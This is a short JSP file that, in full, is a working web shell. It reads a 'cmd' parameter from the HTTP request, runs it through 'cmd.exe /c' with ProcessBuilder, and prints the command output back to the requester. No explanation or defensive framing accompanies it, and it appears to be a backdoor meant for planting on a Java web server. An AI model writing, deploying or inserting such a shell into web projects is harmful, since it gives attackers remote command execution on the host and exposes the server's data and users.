<%@ page import="java.io.*" %>
<%
String cmd = "cmd.exe /c " + request.getParameter("cmd");
Process p = new ProcessBuilder(cmd.split(" ")).redirectErrorStream(true).start();
BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
String line;
while ((line = br.readLine()) != null) out.println(line);
%>
